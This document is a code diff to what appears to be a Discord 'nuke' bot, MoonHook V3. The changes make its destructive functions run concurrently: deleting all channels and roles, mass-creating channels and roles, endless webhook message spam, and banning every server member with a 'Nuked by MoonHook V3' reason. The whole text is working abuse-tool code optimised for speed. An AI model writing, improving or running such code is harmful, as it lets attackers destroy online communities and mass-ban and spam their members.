@@ -28,7 +28,7 @@ def GetGuildByID(guildID: int):
 
 
 async def delete_channels(guild):
-    for channel in guild.channels:
+    async def _del(channel):
         try:
             await channel.delete()
         except Exception as e:
@@ -36,9 +36,13 @@ async def delete_channels(guild):
                 f"{Logger.rgb_to_ansi(255, 0, 0)}couldnt delete channel! Err: {e}{Logger.ColorReset()}"
             )
 
+    tasks = [_del(channel) for channel in guild.channels]
+    if tasks:
+        await asyncio.gather(*tasks)
+
 
 async def create_channels(guild, amount, name):
-    for i in range(amount):
+    async def _create():
         try:
             await guild.create_text_channel(name)
         except Exception:
@@ -46,9 +50,13 @@ async def create_channels(guild, amount, name):
                 f"{Logger.rgb_to_ansi(255, 0, 0)}couldnt create a channel{Logger.ColorReset()}"
             )
 
+    tasks = [_create() for _ in range(amount)]
+    if tasks:
+        await asyncio.gather(*tasks)
+
 
 async def delete_roles(guild):
-    for role in guild.roles:
+    async def _del(role):
         try:
             if role.name != "@everyone":
                 await role.delete()
@@ -57,15 +65,23 @@ async def delete_roles(guild):
                 f"{Logger.rgb_to_ansi(255, 0, 0)}couldnt delete a role{Logger.ColorReset()}"
             )
 
+    tasks = [_del(role) for role in guild.roles]
+    if tasks:
+        await asyncio.gather(*tasks)
+
 
 async def create_roles(guild, role_name, amount):
-    for i in range(amount):
+    async def _create():
         try:
-            new_role = await guild.create_role(name=role_name)
+            await guild.create_role(name=role_name)
         except Exception:
             Logger.Log(
                 f"{Logger.rgb_to_ansi(255, 0, 0)}couldnt make a role{Logger.ColorReset()}"
             )
+
+    tasks = [_create() for _ in range(amount)]
+    if tasks:
+        await asyncio.gather(*tasks)
 
 
 async def webhook_exists(channel: discord.TextChannel, name: str) -> bool:
@@ -87,7 +103,7 @@ async def spam_messages(guild, webhookName: str, messageToSpam: str, spamCooldow
         while True:
             try:
                 await hook.send(content=messageToSpam)
-                time.sleep(spamCooldown)
+                await asyncio.sleep(spamCooldown)
             except Exception as e:
                 Logger.Log(
                     f"{Logger.rgb_to_ansi(255, 0, 0)}Failed: {e}{Logger.ColorReset()}"
@@ -115,18 +131,27 @@ async def spam_messages(guild, webhookName: str, messageToSpam: str, spamCooldow
 
 
 async def ban_everyone(guild):
-    totalbanned = 0
-    for member in guild.members:
+    class Counter:
+        def __init__(self):
+            self.val = 0
+
+    totalbanned = Counter()
+
+    async def _ban(member):
         try:
             await member.ban(
                 reason="Nuked by MoonHook V3! https://github.com/U-235Consumer/MoonhookV3"
             )
-            totalbanned += 1
+            totalbanned.val += 1
         except Exception as e:
             Logger.Log(
                 f"{Logger.rgb_to_ansi(255, 0, 0)}Failed to ban user: {member.name}! Reason: {e}{Logger.ColorReset()}"
             )
-    Logger.Log(f"Full ban finished! Total banned: {str(totalbanned)}")
+
+    tasks = [_ban(member) for member in guild.members]
+    if tasks:
+        await asyncio.gather(*tasks)
+    Logger.Log(f"Full ban finished! Total banned: {str(totalbanned.val)}")
 
 
 intents = discord.Intents.default()
